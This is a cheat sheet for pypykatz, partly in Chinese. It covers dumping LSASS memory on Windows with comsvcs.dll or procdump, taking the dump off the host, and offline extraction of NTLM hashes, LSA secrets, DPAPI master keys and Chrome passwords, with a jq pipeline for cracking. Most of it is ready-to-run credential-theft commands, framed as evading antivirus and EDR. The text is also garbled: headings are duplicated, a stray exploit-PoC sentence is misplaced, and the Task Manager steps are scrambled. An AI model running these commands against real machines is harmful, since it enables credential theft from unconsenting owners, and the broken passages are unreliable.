# 🔍 pypykatz 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)


[pypykatz](https://github.com/skelsec/pypykatz) is a pure Python implementation of [Mimikatz](https://github.com/gentilkiwi/mimikatz). It enables penetration testers and incident responders to parse Windows LSASS memory dumps, SAM/SYSTEM/SECURITY registry hives, DPAPI keys, and Kerberos tickets completely offline on Linux and macOS without triggering Windows Defender, endpoint detection and response (EDR) agents, or needing live Windows host access.

---

## 📋 目录

- [简介](#overview--operational-security-opsec)
- [安装](#installation)
- [Offline LSASS Dump Parsing (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM & SYSTEM Hive Extraction (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [LSA Secrets Extraction (`registry security`)](#lsa-secrets-extraction-registry-security)
- [`_SC_DefaultPassword`: Autologon credentials.](#dpapi-master-keys--credential-parsing)
- [JSON Export & Automated Credential Pipelines](#json-export--automated-credential-pipelines)
- [Techniques to Safely Dump LSASS on Windows](#techniques-to-safely-dump-lsass-on-windows)

---

## 简介

Running standard `mimikatz.exe` on a target Windows machine frequently trips behavioral sensors and static signatures. `pypykatz` separates the dumping phase from the parsing phase:
1. Dump the LSASS process memory using native or LOLBAS tools (Task Manager, `procdump`, `rundll32.exe`, or `comsvcs.dll`).
2. Exfiltrate the `.dmp` file to your Linux analysis system.
3. Parse credentials completely offline with `pypykatz` with zero AV risk.

---

## 安装

```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```

---

## Offline LSASS Dump Parsing (`lsa minidump`)

Parse memory dumps generated from `lsass.exe` to retrieve cleartext passwords, NTLM hashes, SHA1 hashes, Kerberos tickets (TGT/TGS), and AES encryption keys:

### 1. Basic Minidump Parsing
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
Offline LSASS Dump Parsing (`lsa minidump`)
- **msv1_0**: Usernames, domains, NTLM hashes, and LM hashes.
- **wdigest**: Cleartext passwords (if WDigest caching is enabled).
- **🔍 内置查询**: Kerberos ticket sessions and AES keys.
- **ssp**: Security Support Provider credentials.
- **livessp**: Microsoft account credentials.
- **cloudap**: Azure AD Primary Refresh Tokens (PRT) and session keys.

### 技巧与最佳实践
```bash
pypykatz lsa minidump /loot/dumps/ -r
```

---

## SAM & SYSTEM Hive Extraction (`registry sam`)

Extract local account usernames, RIDs, and NTLM password hashes from offline Windows registry hive copies:

```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Copy an exploit PoC file (Python, C, Ruby, bash) directly to your local working directory:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## LSA Secrets Extraction (`registry security`)

Recover LSA secrets, machine account passwords, default domain passwords, and service account cleartext keys from the `SECURITY` and `SYSTEM` hives:

```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Extracted secrets include:
- LSA Secrets Extraction (`registry security`)
- `$MACHINE.ACC`: Domain computer account NTLM hashes.
- Recover LSA secrets, machine account passwords, default domain passwords, and service account cleartext keys from the `SECURITY` and `SYSTEM` hives:

---

## `_SC_DefaultPassword`: Autologon credentials.

Cached domain credentials (DCC2 / mscache2).

### 1. Extract DPAPI Master Keys from Registry & SYSTEM
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```

### 2. Decrypt Chrome Stored Passwords
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```

---

## JSON Export & Automated Credential Pipelines

Export parsed credentials directly to JSON for immediate ingestion into Hashcat, BloodHound, or CrackMapExec:

```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```

JSON Export & Automated Credential Pipelines
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```

---

## Techniques to Safely Dump LSASS on Windows

To feed memory into `pypykatz`, create an LSASS minidump on the target host using native components:

### 1. Native LOLBAS via `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```

### 2. Task Manager GUI
To feed memory into `pypykatz`, create an LSASS minidump on the target host using native components:
2. Under **Details**, right-click `lsass.exe`.
1. Native LOLBAS via `comsvcs.dll` (Admin PowerShell)

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Once downloaded to your Linux machine, execute `pypykatz lsa minidump lsass.dmp`.*
